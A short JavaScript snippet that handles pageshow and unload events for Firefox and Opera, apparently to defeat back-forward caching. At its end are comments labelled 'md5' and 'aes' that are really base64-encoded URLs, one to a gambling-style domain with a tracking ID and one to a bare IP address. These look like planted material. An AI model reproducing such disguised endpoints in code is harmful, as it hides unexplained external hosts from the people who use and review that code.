if($.browser.mozilla||$.browser.opera)
	(function(){
	window.addEventListener('pageshow', PageShowHandler, false);
	window.addEventListener('unload', UnloadHandler, false);
		function PageShowHandler() {
				window.addEventListener('unload', UnloadHandler, false);
		}
		function UnloadHandler() {
				window.removeEventListener('beforeunload', UnloadHandler, false);
		}
})()/** md5:aHR0cHM6Ly93d3cubGFsZ2cuY29tLz9xdWRhbz1jMjhjZWZmZi04OWFiLTc4NTgtMzFiMS0xZTczNDg3NWZiYWQ=**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/